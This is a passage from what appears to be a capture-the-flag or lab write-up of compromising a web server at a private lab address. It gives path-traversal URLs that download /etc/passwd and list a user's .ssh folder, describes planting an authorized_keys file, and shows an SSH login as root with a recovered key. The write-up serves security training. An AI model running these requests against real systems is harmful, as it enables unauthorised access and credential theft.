So we can change the parameter to confirmed and true:

We have confirmed now.
Logging in now:

We notice the parameters though and try to download passwd file:
```
http://192.168.216.231/?cwd=../../../../../../etc&file=passwd&download=true
```
![](../attachment/5a6c27e0692a8400517b597ac2258e84.png)
We get the download

Now getting .ssh keys:
```
http://192.168.216.231/?cwd=../../../../../../home/remi/.ssh/
```

None of these work.
So we can upload our public key as authorized_keys.
Now we get in through ssh:
![](../attachment/7531b2ab065852f3157ffdf21b2e5e3e.png)Now from here we can navigate to the keys folder shown before:

```
ssh -i root root@127.0.0.1 -o IdentitiesOnly=yes
